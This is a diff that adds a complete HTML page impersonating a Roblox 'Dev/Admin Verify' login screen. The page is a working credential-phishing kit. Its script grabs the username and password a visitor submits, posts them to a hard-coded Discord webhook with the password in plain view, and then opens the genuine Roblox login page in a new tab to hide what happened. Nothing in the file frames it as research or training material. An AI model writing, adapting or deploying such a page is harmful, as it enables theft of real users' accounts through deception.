@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox - Dev/Admin Verify</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/f/3/7f3ab11ae38410b5ef9349a731c9b76173aecd4a.jpeg') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .container {
+      width: 320px;
+      margin: 100px auto;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #000;
+      font-family: 'Arial Black', sans-serif;
+    }
+
+    .roblox-o {
+      display: inline-block;
+      width: 22px;
+      height: 22px;
+      background: #000;
+      transform: rotate(30deg);
+      position: relative;
+      margin: 0 3px;
+    }
+
+    .roblox-o::after {
+      content: '';
+      position: absolute;
+      top: 5px;
+      left: 5px;
+      width: 12px;
+      height: 12px;
+      background: white;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 95%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: red;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: darkred;
+    }
+
+    button:focus {
+      outline: none;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+    }
+
+    .note {
+      font-size: 11px;
+      margin-top: 12px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">R<span class="roblox-o"></span>BLOX</div>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Verify</button>
+    </form>
+    <div class="note">This is a dev/admin verifying section.</div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault(); // Prevent default form submission
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const webhookUrl = "https://discord.com/api/webhooks/1412086030877855775/wa9_jGBP_sJDebzWK8r1b7K4sj0gbU26F859kACYs4adfMzBwQBl8zosgUJGDPU-u9hI"; // Discord webhook URL
+      const message = `🔐 Roblox Login:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      try {
+        // Send data to Discord webhook
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: message
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error(`Failed to send data to Discord: ${response.statusText}`);
+        }
+
+        // Open Roblox login page in a new tab
+        const a = document.createElement('a');
+        a.href = "https://www.roblox.com/login";
+        a.target = "_blank";
+        a.rel = "noopener noreferrer";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a); // Clean up
+      } catch (error) {
+        console.error("Error:", error);
+        alert("An error occurred while processing your request. Please try again.");
+      }
+    });
+  </script>
+</body>
+  </html>
